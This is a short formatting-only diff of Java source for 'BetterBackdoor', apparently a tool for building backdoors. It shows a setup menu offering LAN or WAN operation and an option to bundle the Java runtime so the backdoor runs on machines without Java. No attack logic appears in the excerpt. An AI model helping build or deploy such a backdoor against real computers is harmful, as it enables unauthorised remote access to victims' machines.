@@ -17,7 +17,7 @@ public class BetterBackdoor {
 
 	/**
 	 * Starts BetterBackdoor.
-	 * 
+	 *
 	 * @param args command line arguments
 	 */
 	public static void main(String[] args) {
@@ -37,12 +37,13 @@ public class BetterBackdoor {
 					+ "or over the internet, WAN (requires port forwarding):");
 			System.out.println("[0] LAN");
 			System.out.println("[1] WAN (requires port forwarding)");
-			String ipType = getInput("op01").equals("0") ? "internal":"external";
+			String ipType = getInput("op01").equals("0") ? "internal" : "external";
 
 			boolean jre = false;
 			if (os.contains("Windows")) {
 				System.out.println(
-						"Would you like to package the Java Runtime Environment from your computer with the backdoor\nso it can be run on computers without Java installed?(y/n):");
+						"Would you like to package the Java Runtime Environment from your computer with the backdoor\nso it can be run on computers without Java installed?" +
+								"(y/n):");
 				jre = Boolean.parseBoolean(getInput("yn"));
 			} else
 				System.out.println(
